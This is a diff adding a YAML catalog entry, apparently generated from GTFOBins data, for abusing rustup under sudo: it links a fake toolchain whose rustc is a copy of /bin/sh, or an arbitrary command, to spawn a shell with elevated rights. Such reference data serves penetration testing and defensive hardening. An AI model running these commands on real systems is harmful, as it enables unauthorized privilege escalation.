@@ -1,0 +1,107 @@
+id: gtfobins/rustup/shell/sudo
+type: binary
+platform: linux
+name: rustup
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'mkdir /path/to/temp-dir/bin/
+
+    mkdir /path/to/temp-dir/lib/
+
+    cp /bin/sh /path/to/temp-dir/bin/rustc
+
+    rustup toolchain link x /path/to/temp-dir/
+
+    rustup run x rustc'
+references:
+- https://gtfobins.github.io/gtfobins/rustup/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        rustup:
+          functions:
+            command:
+            - code: 'mkdir /path/to/temp-dir/bin/
+
+                mkdir /path/to/temp-dir/lib/
+
+                echo ''/path/to/command'' >/path/to/temp-dir/bin/rustc
+
+                chmod +x /path/to/temp-dir/bin/rustc
+
+                rustup toolchain link x /path/to/temp-dir/
+
+                rustup run x rustc'
+              contexts:
+                sudo: null
+                unprivileged: null
+            shell:
+            - code: 'mkdir /path/to/temp-dir/bin/
+
+                mkdir /path/to/temp-dir/lib/
+
+                cp /bin/sh /path/to/temp-dir/bin/rustc
+
+                rustup toolchain link x /path/to/temp-dir/
+
+                rustup run x rustc'
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/rustup/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:7d762ff95aaf4f19030c3f4caa2f5ead21435c33b55cccab284eec06d1a12759
